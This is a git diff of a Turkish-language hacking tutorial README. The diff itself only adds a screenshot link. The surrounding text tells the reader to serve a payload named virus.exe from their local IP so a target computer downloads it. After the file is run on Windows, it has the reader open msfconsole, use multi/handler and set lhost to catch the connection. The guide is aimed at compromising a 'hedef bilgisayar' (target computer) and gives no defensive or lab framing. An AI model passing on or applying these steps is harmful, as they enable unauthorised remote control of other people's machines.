@@ -13,6 +13,8 @@
 ![Screenshot_2022-07-17_06_45_23](https://user-images.githubusercontent.com/100614268/179394987-3e5f2793-89de-411e-b523-4f39b78a551e.png)
 
 ## Evet Bunun Anlami Artik Bizim Local IP mizi Bir Cihaz Web Tarayicisina Girerse Direk virus.exe yi Download Isticek. Bu Sayede Sadece Hedef Bilgisayara Kendi Local Ipnizi Girerek Bilgisayara payloadi Yerlestire Bilirsiniz. Peki Dosyayi Windowsa Atip Bir Yolla Calistirdiniz Diyelim. Devaminda Ne Yapmamiz Gerek?
+  
+![Screenshot_2022-07-17_06_45_59](https://user-images.githubusercontent.com/100614268/179395284-d205fc88-c31f-47e7-bf03-d654423a2bf5.png)
 
 ## Terminale msfconsole Yaziyoruz. Daha Sonra use multi/handler Yaziyoruz. Sonra show options Yaziyoruz Ve LHOSTU  set lhost 192.168.x.x  Seklinde Yazip local Ipnizi Dinleme Araci Yapiyorsunuz. Ve Artik Hazirsiniz. 
 ![Screenshot_2022-07-17_06_47_02](https://user-images.githubusercontent.com/100614268/179395205-91bc1d94-6ca9-4c6f-9bb7-e502ade40310.png)
